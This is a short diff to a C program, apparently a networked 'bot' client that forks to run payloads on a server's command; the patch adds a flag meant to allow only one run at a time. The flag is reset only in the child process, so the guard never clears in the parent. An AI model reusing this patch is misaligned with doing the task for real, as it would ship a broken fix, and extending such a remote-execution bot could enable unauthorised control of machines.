@@ -15,6 +15,8 @@
 #define PAYLOAD_MAX 1024+1
 
 
+int run_process_on = 0;
+
 void usage()
 {
 	fprintf(stderr, "Usage: ./bot ip port\n");
@@ -237,9 +239,11 @@ int main(int argc, char **argv)
 				prog_flag = 1;
 				break;
 			case '3':
-				if(prog_flag){
+				if(prog_flag && !run_process_on){
+					run_process_on = 1;
 					if((pid = fork()) == 0){
 						run(sockfd, message, payload);
+						run_process_on = 0;
 						exit(0);
 					}
 				}
